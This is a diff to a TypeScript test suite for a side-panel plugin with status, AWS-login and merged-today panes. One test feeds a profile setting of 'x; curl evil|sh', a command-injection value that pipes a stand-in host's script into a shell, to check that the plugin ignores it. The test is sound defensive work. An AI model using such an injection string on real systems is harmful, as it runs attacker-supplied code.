@@ -15,6 +15,8 @@ type World = {
   ghJson?: string // gh pr list's raw answer
   login?: string | null // what `gh api user` answers; null fails
   czw?: string // CZW_SESSION
+  expiresAt?: string // the cached SSO token's expiry
+  merged?: object[] // what gh answers for merged pull requests
 }
 
 // What a session answers beneath the plugin: gh, the sections command, the environment and the
@@ -24,8 +26,21 @@ function world(on: On, w: World = {}) {
   const opened: string[] = []
   const submitted: string[] = []
   const order: string[] = []
+  const called: Record<string, unknown>[] = []
+  const titles: string[] = []
+  on('fs.read', (_$, e) => {
+    if (e.path.endsWith('/.aws/config')) return { value: '[profile management]\nsso_session = s\n[sso-session s]\nsso_start_url = https://p.awsapps.com/start\n' } as never
+    if (e.path.endsWith('/t.json') && w.expiresAt !== undefined) return { value: JSON.stringify({ startUrl: 'https://p.awsapps.com/start', expiresAt: w.expiresAt, accessToken: 'x' }) } as never
+    return { value: '' } as never
+  })
+  on('fs.list', () => ({ value: [{ name: 't.json', kind: 'file', size: 1, mtimeMs: 0, isLink: false }] }) as never)
+  on('tool.call', { tool: 'mcp__owner-queue__ask_owner_to_run' }, (_$, e) => {
+    called.push({ ...e })
+    return { result: 'queued' } as never
+  })
   on('process.run', (_$, e) => {
     ran.push([...e.argv])
+    if (e.argv[0] === 'gh' && e.argv.includes('merged')) return { value: { exitCode: 0, stdout: JSON.stringify(w.merged ?? []), stderr: '' } } as never
     order.push(e.argv[0])
     if (w.rejects === 'gh' && e.argv[0] === 'gh') return { deny: 'timed out after 30000 ms' } as never
     if (w.rejects === 'sections' && e.argv[0] === 'bash') return { deny: 'timed out after 30000 ms' } as never
@@ -48,7 +63,8 @@ function world(on: On, w: World = {}) {
   on('classic.SessionStart', () => ({}) as never)
   on('command.register', (_$, e) => ({ value: { command: e.name } }) as never)
   on('ui.open', (_$, e) => {
-    opened.push(e.id)
+    opened.push(e.id + (e.focus ? '+focus' : ''))
+    titles.push(e.title ?? '')
     order.push('open')
     return { value: { isPlaced: true } } as never
   })
@@ -57,7 +73,7 @@ function world(on: On, w: World = {}) {
     submitted.push(e.text)
     return { text: e.text } as never
   })
-  return { ran, opened, submitted, order }
+  return { ran, opened, submitted, order, called, titles }
 }
 
 type T = Parameters<Parameters<typeof test>[2] & Function>[0]
@@ -69,14 +85,15 @@ async function start($: T, title: string) {
 }
 
 const drawn = async ($: T) => JSON.stringify(await $.ui.render(PANE))
-const reads = (w: { ran: string[][] }) => w.ran.filter(argv => argv[0] === 'gh' && argv[1] === 'pr').length
+const reads = (w: { ran: string[][] }) => w.ran.filter(argv => argv[0] === 'gh' && argv[1] === 'pr' && argv.includes('open')).length
+const mergedReads = (w: { ran: string[][] }) => w.ran.filter(argv => argv[0] === 'gh' && argv.includes('merged')).length
 
 describe('which sessions', () => {
   test('a session the setting names reads GitHub and opens the pane', { options: OPTIONS }, async ($, on) => {
     mock.clock(on)
     const w = world(on)
     await start($, 'my-coordinator')
-    expect(w.opened).toEqual(['side-panel'])
+    expect(w.opened[0]).toBe('side-panel')
     expect(w.ran.some(argv => argv.join(' ').startsWith('gh pr list -R o/api'))).toBe(true)
   })
 
@@ -154,7 +171,7 @@ describe('the session name', () => {
     mock.clock(on)
     const w = world(on, { czw: 'coordinator' })
     await start($, '')
-    expect(w.opened).toEqual(['side-panel'])
+    expect(w.opened[0]).toBe('side-panel')
   })
 
   test('another CZW_SESSION neither reads nor opens', { options: OPTIONS }, async ($, on) => {
@@ -169,7 +186,7 @@ describe('the session name', () => {
     mock.clock(on)
     const w = world(on, { czw: 'api' })
     await start($, 'coordinator')
-    expect(w.opened).toEqual(['side-panel'])
+    expect(w.opened[0]).toBe('side-panel')
   })
 
   test('with neither, a sessions setting shows the pane nowhere', { options: OPTIONS }, async ($, on) => {
@@ -238,7 +255,7 @@ describe('failures', () => {
     const clock = mock.clock(on)
     const w = world(on, { rejects: 'gh' })
     await start($, 'coordinator')
-    expect(w.opened).toEqual(['side-panel'])
+    expect(w.opened[0]).toBe('side-panel')
     const now = await drawn($)
     expect(now).toMatch(/o\/api: [^"]*timed out after 30000 ms/)
     expect(now).toContain('27% used')
@@ -312,10 +329,114 @@ describe('the pane', () => {
     await start($, 'coordinator')
     expect(w.ran).toEqual([])
     await $.command.run({ command: 'panel', args: '' } as never)
-    expect(w.order.slice(0, 3)).toEqual(['gh', 'bash', 'open'])
+    expect(w.order.slice(0, 2)).toEqual(['gh', 'bash'])
+    expect(w.order.indexOf('open')).toBeGreaterThan(1)
     await $.command.run({ command: 'panel', args: '' } as never)
     expect(reads(w)).toBe(2)
     await clock.advance(60_000)
     expect(reads(w)).toBe(3)
+  })
+})
+
+// One of the side panel's panes as drawn.
+async function view($: T, name: 'aws' | 'today'): Promise<string> {
+  return JSON.stringify(await $.ui.render({ component: 'Pane', requestId: `side-panel-${name}`, surface: 'terminal', props: {} } as never))
+}
+
+describe('panes', () => {
+  test('status, aws and today are three panes, each opened by a fixed id with a fixed title, never another', { options: OPTIONS }, async ($, on) => {
+    mock.clock(on)
+    const w = world(on)
+    await start($, 'coordinator')
+    await $.command.run({ command: 'panel', args: '' } as never)
+    await $.command.run({ command: 'panel', args: '' } as never)
+    const pairs = new Set(w.opened.map((id, i) => `${id}=${w.titles[i]}`))
+    expect(pairs).toEqual(new Set(['side-panel=status', 'side-panel-aws=aws', 'side-panel-today=today']))
+    expect(w.opened.slice(-3)).toEqual(['side-panel', 'side-panel-aws', 'side-panel-today'])
+  })
+
+  test('no number keys; each pane shows the engine\'s keys and Esc', { options: OPTIONS }, async ($, on) => {
+    mock.clock(on)
+    world(on)
+    await start($, 'coordinator')
+    for (const drawnPane of [await drawn($), await view($, 'aws'), await view($, 'today')]) {
+      expect(drawnPane).toContain('Esc: back to the prompt')
+      expect(drawnPane).not.toContain('"hotkey":"1"')
+      expect(drawnPane).not.toContain('"hotkey":"2"')
+      expect(drawnPane).not.toContain('"hotkey":"3"')
+    }
+  })
+})
+
+describe('the aws tab', () => {
+  test('shows the time left on the login, green with more than 30 minutes', { options: OPTIONS }, async ($, on) => {
+    mock.clock(on, { now: Date.parse('2026-10-23T10:00:00Z') })
+    world(on, { expiresAt: '2026-10-23T12:30:00Z' })
+    await start($, 'coordinator')
+    const shown = await view($, 'aws')
+    expect(shown).toContain('2h 30m')
+    expect(shown).toContain('green')
+    expect(shown).not.toContain('Queue login')
+  })
+
+  test('turns red under 30 minutes and queues the login in owner-queue on a press', { options: OPTIONS }, async ($, on) => {
+    mock.clock(on, { now: Date.parse('2026-10-23T10:00:00Z') })
+    const w = world(on, { expiresAt: '2026-10-23T10:20:00Z' })
+    await start($, 'coordinator')
+    const shown = await view($, 'aws')
+    expect(shown).toContain('20m')
+    expect(shown).toContain('red')
+    await $.ui.press({ plugin: 'side-panel', key: 'aws-login' })
+    expect(w.called[0]).toMatchObject({ command: 'aws sso login --profile management' })
+  })
+
+  test('an expired or missing login offers the login too', { options: OPTIONS }, async ($, on) => {
+    mock.clock(on, { now: Date.parse('2026-10-23T10:00:00Z') })
+    world(on)
+    await start($, 'coordinator')
+    const shown = await view($, 'aws')
+    expect(shown).toContain('no login cached')
+    expect(shown).toContain('Queue login')
+  })
+
+  test('a profile setting that is not a plain name falls back to management, in the queued command too', { options: { ...OPTIONS, aws_profile: 'x; curl evil|sh' } }, async ($, on) => {
+    mock.clock(on)
+    const w = world(on)
+    await start($, 'coordinator')
+    const shown = await view($, 'aws')
+    expect(shown).not.toContain('curl')
+    await $.ui.press({ plugin: 'side-panel', key: 'aws-login' })
+    expect(w.called[0]).toMatchObject({ command: 'aws sso login --profile management' })
+  })
+
+  test('the profile is a setting', { options: { ...OPTIONS, aws_profile: 'dev' } }, async ($, on) => {
+    mock.clock(on)
+    world(on)
+    await start($, 'coordinator')
+    expect(await view($, 'aws')).toContain('no sso_start_url for profile dev')
+  })
+})
+
+describe('the today tab', () => {
+  const NOW = new Date(2026, 9, 23, 15, 0).getTime()
+  const MERGED = [{ number: 7, title: 'feat: tabs', url: 'https://github.com/o/api/pull/7', mergedAt: new Date(NOW - 3600_000).toISOString(), mergeCommit: { oid: 'abcdef1234567' } }]
+  test('lists what merged today and the heads waiting for a first review', { options: OPTIONS }, async ($, on) => {
+    mock.clock(on, { now: NOW })
+    world(on, { merged: MERGED })
+    await start($, 'coordinator')
+    const shown = await view($, 'today')
+    for (const k of ['"7"', 'abcdef1', 'feat: tabs', 'https://github.com/o/api/pull/7', '"12"', 'b5687a5']) expect(shown).toContain(k)
+  })
+
+  test('asks gh once per repository, kept two minutes', { options: { ...OPTIONS, repos: 'o/api o/web' } }, async ($, on) => {
+    const clock = mock.clock(on, { now: NOW })
+    const w = world(on, { merged: MERGED })
+    await start($, 'coordinator')
+    expect(mergedReads(w)).toBe(2)
+    expect(w.ran).toContainEqual(['gh', 'pr', 'list', '-R', 'o/api', '--state', 'merged', '--search', 'merged:>=2026-10-23', '--limit', '50', '--json', 'number,title,url,mergedAt,mergeCommit'])
+    await clock.advance(60_000)
+    expect(mergedReads(w)).toBe(2)
+    await clock.advance(60_000)
+    expect(mergedReads(w)).toBe(4)
   })
 })
